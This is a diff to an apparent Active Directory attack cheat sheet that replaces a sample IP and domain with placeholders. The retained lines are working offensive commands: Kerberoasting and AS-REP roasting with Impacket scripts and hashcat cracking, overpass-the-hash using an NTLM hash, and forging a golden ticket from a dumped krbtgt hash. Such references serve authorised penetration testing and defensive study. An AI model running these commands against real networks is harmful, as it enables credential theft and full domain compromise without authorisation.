@@ -19,7 +19,7 @@ references:
 
 ```bash
 # Request service tickets, crack them offline (weak service-account passwords)
-GetUserSPNs.py -request -dc-ip 10.10.10.5 corp.local/jsmith:'Winter2026!'
+GetUserSPNs.py -request -dc-ip TARGET DOMAIN/jsmith:'Winter2026!'
 hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
 ```
 
@@ -27,7 +27,7 @@ hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
 
 ```bash
 # Accounts with "Do not require Kerberos preauthentication"
-GetNPUsers.py -dc-ip 10.10.10.5 corp.local/ -usersfile users.txt -no-pass
+GetNPUsers.py -dc-ip TARGET DOMAIN/ -usersfile users.txt -no-pass
 hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
 ```
 
@@ -35,11 +35,11 @@ hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
 
 ```bash
 # NTLM hash -> Kerberos TGT (overpass-the-hash), then use -k everywhere
-getTGT.py corp.local/jsmith -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
+getTGT.py DOMAIN/jsmith -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
 export KRB5CCNAME=jsmith.ccache
 netexec smb DC01 --use-kcache
 # Build a golden ticket once you have the krbtgt hash (from secretsdump -just-dc)
-ticketer.py -nthash <krbtgt_hash> -domain-sid <sid> -domain corp.local Administrator
+ticketer.py -nthash <krbtgt_hash> -domain-sid <sid> -domain DOMAIN Administrator
 ```
 
 ## Windows, with Rubeus
